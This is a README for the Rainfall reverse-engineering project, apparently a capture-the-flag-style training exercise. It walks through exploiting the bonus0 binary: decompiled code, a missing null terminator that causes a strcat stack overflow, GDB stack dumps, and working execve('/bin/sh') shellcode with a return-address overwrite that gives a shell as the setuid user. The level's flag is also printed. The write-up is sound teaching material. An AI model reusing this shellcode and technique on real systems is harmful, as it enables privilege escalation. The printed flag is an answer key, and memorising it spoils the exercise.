# Rainfall

This project is a hands-on introduction to reverse engineering techniques, focused on *analyzing* and **exploiting** binary-level vulnerabilities in compiled C programs. </br>
The objective is to understand how programs behave at runtime, identify **logic flaws** or **memory corruption** issues, and leverage these weaknesses to alter the program’s control flow — often with the goal of spawning a shell or bypassing authentication.

- **Key areas** covered include:
    - `Disassembling and analyzing binaries` using tools like `GDB`, `objdump`, and `strings`
    - `Understanding memory layout` (`stack`, `heap`, `BSS`, `data`)
    - **Identifying vulnerabilities** such as:
        - `Buffer overflows`
        - `Format string vulnerabilities`
        - `Incorrect use` of `memcpy`, `strcpy`, `atoi`, etc.
    - **Exploiting vulnerabilities** to:
        - `Overwrite return addresses`
        - `Redirect execution flow`
        - `Inject and execute shellcode`

Each exercise is built around a minimal C program containing a subtle flaw. Through static and dynamic analysis, the goal is to reverse-engineer the binary logic, craft a payload, and achieve code execution.



# Walkthrough

For each level, a detailed walkthrough is provided, thoroughly explaining the underlying vulnerabilities, the logic behind the exploit, and the techniques used to manipulate the program's behavior. </br>

For example, see the walkthrough for `bonus0` below.

## Bonus 0

### General Informations 

**Path** : `/home/user/bonus0/bonus0` </br>
**File** : 
```
bonus0: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xfef8b17db26c56ebfd1e20f17286fae3729a5ade, not stripped
```
**Permissions**: `-rwsr-s---+ 1 bonus1 users 5566 Mar  6  2016 bonus0`

### Static Analysis

After decompiling the binary in ghidra, we get the pseudo code below: 

```
void p(char *param_1,char *param_2)
{
  char *pcVar1;
  char local_100c [4104];
  
  puts(param_2);
  read(0,local_100c,0x1000);
  pcVar1 = strchr(local_100c,10);
  *pcVar1 = '\0';
  strncpy(param_1,local_100c,0x14);
  return;
}

void pp(char *param_1)
{
  char cVar1;
  uint uVar2;
  char *pcVar3;
  byte bVar4;
  char local_34 [20];
  char local_20 [20];
  
  bVar4 = 0;
  p(local_34,&DAT_080486a0);
  p(local_20,&DAT_080486a0);
  strcpy(param_1,local_34);
  uVar2 = 0xffffffff;
  pcVar3 = param_1;
  do {
    if (uVar2 == 0) break;
    uVar2 = uVar2 - 1;
    cVar1 = *pcVar3;
    pcVar3 = pcVar3 + (uint)bVar4 * -2 + 1;
  } while (cVar1 != '\0');
  (param_1 + (~uVar2 - 1))[0] = ' ';
  (param_1 + (~uVar2 - 1))[1] = '\0';
  strcat(param_1,local_20);
  return;
}

undefined4 main(void)
{
  char local_3a [54];
  
  pp(local_3a);
  puts(local_3a);
  return 0;
}
```

- `main`, calls the `pp` function with a buffer of 54 bytes as argument
- `pp`, calls the `p` function twice with 2 different buffers
  - Copies the first buffer to the parameter buffer passed by main, and add it a space character ` `
  - Then concatenates the parameter buffer and the second buffer
- `p`, displays a message and reads `0x1000` (4096) bytes from user input, but stores only the first 20 bytes into the buffer passed as a parameter


### Vulnerability found 


The vulnerability lies in the function `p`. </br>
The null-terminating character `\0` — used to mark the end of a string — is not properly handled. In fact, the null-terminator `\0` is placed at the index of the line feed `\n` character found by `strchr`:

```
  pcVar1 = strchr(local_100c,10);
  *pcVar1 = '\0';
  strncpy(param_1,local_100c,0x14);
```
So, if the user input is longer than 20 characters, the null-terminator `\0` is not included in the `param_1` buffer.

The 2 buffers are adjacent in the stack. Without a null-terminator `\0` in the first buffer, the second buffer is interpreted as a continuation of the first one. </br>
This means that in the `pp` function, the call to `strcpy(param_1, local_34)` will not only copy the first buffer but also the second one.

If we fill both buffers with 20 characters each, then `param_1` ends up storing 40 bytes out of the 54-bytes space available. </br>
The problem arises when we call `strcat` to append the second buffer. Since an additional 20 bytes are added to an already 40-byte-long buffer, this results in a buffer overflow.

This buffer overflow is enough to overwrite the return address of main.

### Dynamic Analysis

A part of the dynamic analysis was carried out above in the **vulnerability found** section. We'll now build on that. </br>
We place 2 breakpoints in the `pp` function: 
- The first one is after the call to `strcpy`
- The second is after the call to `strcat`
```
(gdb) b *0x0804855e 
(gdb) b *0x0804859d
```

We start the program with 2 arguments of 20 bytes each:
```
(gdb) r < <(python -c 'print "A"*20'; python -c 'print "AAAABBBBCCCCDDDDEEEE"')
(gdb) x/50x $esp 
...
0xbffff5b0:	0x00000000	0x00000000	0x41414141	0x41414141
0xbffff5c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff5d0:	0x42424242	0x43434343	0x44444444	0x45454545
...
0xbffff600:	0xb7fd13e4	0x41410000	0x41414141	0x41414141
0xbffff610:	0x41414141	0x41414141	0x41414141	0x42424141
0xbffff620:	0x43434242	0x44444343	0x45454444	0x0ff44545
0xbffff630:	0x0800b7fd	0x00000000	0x00000000	0xb7e454d3
```

We used *process substitution* `r < <(cmd1; cmd2)` in GDB to freely build our payload using Python. </br>

After breaking right after the `strcpy`, we observe two parts: </br>
The first part of the stack shows the 2 buffers one after another. The second part shows the same final buffer, but this time located elsewhere the final buffer `param_1[54]`, in the `main` stackframe. </br>
Looking just after this buffer, we see the address `0xb7e454d3`, which corresponds to the return address of main — `0xb7e454d3 <__libc_start_main+243>`.

We continue to the next breakpoint, located just after the call to `strcat`:
```
(gdb) c
(gdb) x/50x $esp 
...
0xbffff5b0:	0x00000000	0x00000000	0x41414141	0x41414141 <- first buffer 
0xbffff5c0:	0x41414141	0x41414141	0x41414141	0x41414141 <- second buffer
0xbffff5d0:	0x42424242	0x43434343	0x44444444	0x45454545
...
0xbffff600:	0xb7fd13e4	0x41410000	0x41414141	0x41414141 <- final buffer
0xbffff610:	0x41414141	0x41414141	0x41414141	0x42424141
0xbffff620:	0x43434242	0x44444343	0x45454444	0x0ff44545
0xbffff630:	0x4120b7fd	0x42414141	0x43424242	0x44434343 <- the return addr of main
```

The second buffer is copied again into the final buffer, which overwrites the return address of main with `CCCD - 0x44434343`. </br>

Now, we overwrite the return address of main at `0xbffff63c: 0x44434343` with the address of the final buffer `0xbffff606: 0x41414141`. </br>
We add a breakpoint in main and run the program.

``` 
(gdb) b *0x080485c5
```

We change the `AAA..` to the `0xCC` instruction to trap the execution. </br>

> Why? Because instructions like `0x41,0x45` are valid assembly opcodes, so the CPU will execute them until it hits an invalid address like `0xbffff62e: 0xb7fd0ff4`, and segfault.
```
(gdb) r < <(python -c 'print "0xCC"*20'; python -c 'print "AAAABBBBC" + "\x06\xf6\xff\xbf" + "DDDEEEE"')
(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0xbffff607 in ?? ()
```

Okay, it worked, although the address is not exactly the same, but close enough… Let's continue.
We’ll replace the `SIGTRAP (0xCC)` instructions with a 21-bytes shellcode: `"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"`
```
(gdb) r < <(python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"'; python -c 'print "\x80AAABBBBC" + "\x06\xf6\xff\xbf" + "DDDEEEE"')
...
(gdb) c
process 3682 is executing new program: /bin/dash
[Inferior 1 (process 3682) exited normally]
```
Super ! The shell is executed.
Let's try it outside GDB:
```
bonus0@RainFall:~$ (python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"'; python -c 'print "\x80AAABBBBC" + "\x06\xf6\xff\xbf" + "DDDEEEE"'; cat) | ./bonus0 
...
whoami
Segmentation fault (core dumped)
```

Hmm… it doesn't work 😕 — why?
In fact, GDB adds environment variables, which causes the stack addresses to differ between GDB and the terminal. [Read more](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it)
```
(gdb) show env
...
LINES=39
COLUMNS=120
(gdb) unset env LINES
(gdb) unset env COLUMNS
```

We need to unset them to retrieve the same stack layout as in GDB.
Then, check whether the stack addresses have changed — in our case, whether the address of the final buffer is different from `0xbffff606`.
```
(gdb) r < <(python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"'; python -c 'print "\x80AAABBBBC" + "\x06\xf6\xff\xbf" + "DDDEEEE"')
...
Program received signal SIGSEGV, Segmentation fault.
0xbffff606 in ?? ()
(gdb) x/50x 0xbffff606
...
0xbffff626:	0xe1f7c931	0x68510bb0	0x68732f2f	0x69622f68
```

The address did change — it’s now at `0xbffff626`. So we update our payload accordingly and try again in the terminal:

```
bonus0@RainFall:~$ (python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"'; python -c 'print "\x80AAABBBBC" + "\x26\xf6\xff\xbf" + "DDDEEEE"'; cat) | ./bonus0 
 - 
 - 
1���
    Qh//shh/bin��̀AAABBBBC&���DDDEEEE��� �AAABBBBC&���DDDEEEE���
whoami
bonus1
```

Tada !

 
### Payload construction 

We first write our payload into the 2 buffers:
```
python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"'; python -c 'print "\x80"'
```

Then we fill the second buffer and add padding to reach the return address of main.
```
python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"'; python -c 'print "\x80AAABBBBC" + "0xaddr_ret" + "DDDEEEE"'
```

And finally, we overwrite the return address with the start address of the buffer:
```
python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd" ';  python -c 'print "\x80"+ "A"*8 + "\x26\xf6\xff\xbf" + "DDDEEEE"'
```

### Demonstration 

```
bonus0@RainFall:~$ (python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"'; python -c 'print "\x80AAABBBBC" + "\x26\xf6\xff\xbf" + "DDDEEEE"'; cat) | ./bonus0 
 - 
 - 
1���
    Qh//shh/bin��̀AAABBBBC&���DDDEEEE��� �AAABBBBC&���DDDEEEE���
whoami
bonus1
```

### Flag 

```
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```